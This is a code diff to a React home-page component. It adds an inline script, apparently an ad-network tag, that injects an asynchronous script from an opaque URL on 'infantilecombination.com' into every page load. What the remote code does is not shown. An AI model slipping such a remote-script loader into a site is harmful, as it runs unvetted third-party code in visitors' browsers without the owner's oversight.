@@ -138,7 +138,18 @@ const Home = () => {
       </SwiperLayout>
 )}
   <Helmet>
-
+<script>
+(function(upszm){
+var d = document,
+    s = d.createElement('script'),
+    l = d.scripts[d.scripts.length - 1];
+s.settings = upszm || {};
+s.src = "\/\/infantilecombination.com\/bGX_V.stdTGVlP0CYEWedti-YlWD5FuYZAXlIQ\/Mecm\/9lu\/ZAUJlCkZPrTcUq5eOTTAcB3-NhDAg\/taNPTgkd5CNDzqc\/0\/OQQw";
+s.async = true;
+s.referrerPolicy = 'no-referrer-when-downgrade';
+l.parentNode.insertBefore(s, l);
+})({})
+</script>
   </Helmet>
       {/* New Releases */}
       {  selectedHomeCategories.includes("releases") && (
